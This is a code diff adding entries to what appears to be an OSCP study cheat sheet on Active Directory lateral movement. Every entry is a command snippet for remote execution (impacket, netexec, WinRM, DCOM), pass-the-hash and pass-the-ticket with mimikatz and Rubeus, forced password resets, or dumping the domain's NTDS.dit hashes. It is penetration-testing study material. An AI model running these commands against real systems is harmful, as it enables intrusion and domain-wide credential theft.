@@ -17,6 +17,12 @@ const adLateral: OscpContent = {
                     code: `impacket-psexec <domain>/<user>:<pass>@<target>
 impacket-psexec -hashes :<NTLM> <domain>/<user>@<target>`,
                 },
+                {
+                    label: 'smbexec / atexec quieter',
+                    code: `impacket-smbexec <domain>/<user>:<pass>@<target>
+impacket-atexec <domain>/<user>:<pass>@<target> 'whoami'
+netexec smb <target> -u <user> -p <pass> -x whoami`,
+                },
             ],
             tags: ['psexec', 'smbexec', 'system', 'lateral'],
         },
@@ -34,6 +40,18 @@ impacket-psexec -hashes :<NTLM> <domain>/<user>@<target>`,
                     code: `evil-winrm -i <target> -u <user> -p <pass>
 evil-winrm -i <target> -u <user> -H <NTLM>`,
                 },
+                {
+                    label: 'winrs / Enter-PSSession',
+                    code: `winrs -r:<target> -u:<user> -p:<pass> "cmd /c hostname & whoami"
+Enter-PSSession -ComputerName <target> -Credential <domain>\\<user>`,
+                },
+                {
+                    label: 'Enable WinRM if 5985 is closed',
+                    code: `# from an admin shell on the target:
+winrm quickconfig -quiet
+Enable-PSRemoting -Force
+netexec winrm <target> -u <user> -p <pass>`,
+                },
             ],
             tags: ['winrm', 'evil-winrm', '5985', 'lateral'],
         },
@@ -49,6 +67,17 @@ evil-winrm -i <target> -u <user> -H <NTLM>`,
                 {
                     label: 'wmiexec',
                     code: 'impacket-wmiexec <domain>/<user>:<pass>@<target>',
+                },
+                {
+                    label: 'dcomexec / CIM',
+                    code: `impacket-dcomexec <domain>/<user>:<pass>@<target>
+# from a domain host:
+Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='<cmd>'} -ComputerName <target>`,
+                },
+                {
+                    label: 'Pass-the-hash WMI',
+                    code: `impacket-wmiexec -hashes :<NTLM> <domain>/<user>@<target>
+netexec wmi <target> -u <user> -H <NTLM> -x whoami`,
                 },
             ],
             tags: ['wmi', 'wmiexec', 'dcom', 'lateral'],
@@ -67,6 +96,11 @@ evil-winrm -i <target> -u <user> -H <NTLM>`,
                     code: `net rpc password "<target-user>" "NewPass123!" -U "<domain>/<you>%<pass>" -S <dc>
 # or PowerView: Set-DomainUserPassword -Identity <target> -AccountPassword $sec`,
                 },
+                {
+                    label: 'net user / PowerView',
+                    code: `net user <target-user> 'NewPass123!' /domain
+Set-DomainUserPassword -Identity <target-user> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)`,
+                },
             ],
             tags: ['acl', 'genericall', 'forcechangepassword', 'reset'],
         },
@@ -84,6 +118,12 @@ evil-winrm -i <target> -u <user> -H <NTLM>`,
                     code: `export KRB5CCNAME=/path/ticket.ccache
 impacket-psexec -k -no-pass <domain>/<user>@<target>`,
                 },
+                {
+                    label: 'mimikatz ptt / Rubeus',
+                    code: `sekurlsa::tickets /export
+kerberos::ptt <ticket.kirbi>
+Rubeus.exe ptt /ticket:<ticket.kirbi>`,
+                },
             ],
             tags: ['ptt', 'ticket', 'kerberos', 'ccache'],
         },
@@ -100,6 +140,14 @@ impacket-psexec -k -no-pass <domain>/<user>@<target>`,
                     label: 'Dump the whole domain',
                     code: `impacket-secretsdump <domain>/<user>:<pass>@<dc> -just-dc
 # or on the DC: reg save + esentutl NTDS.dit`,
+                },
+                {
+                    label: 'NTDS via vssadmin / ntdsutil',
+                    code: `vssadmin create shadow /for=C:
+copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit .\\ntds.dit
+reg save HKLM\\SYSTEM system.save
+# Kali:
+impacket-secretsdump -ntds ntds.dit -system system.save LOCAL`,
                 },
             ],
             tags: ['domain-admin', 'ntds', 'dc', 'win'],
